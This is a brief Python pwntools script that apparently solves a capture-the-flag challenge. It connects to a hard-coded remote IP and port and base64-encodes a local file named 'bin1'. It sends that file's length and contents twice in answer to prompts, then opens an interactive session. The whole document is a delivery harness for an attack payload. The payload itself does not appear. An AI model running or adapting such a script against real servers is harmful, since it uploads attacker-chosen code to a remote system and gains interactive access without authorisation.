from pwn import *
import base64
r=remote("211.239.124.243",18608)
context.log_level='debug'
f=open("bin1","rb")
data=base64.b64encode(f.read())
r.sendlineafter(": ",f'{len(data)}')
r.sendlineafter(": ",f'{len(data)}')
r.sendafter(": ",data)
r.sendafter(": ",data)
r.interactive()
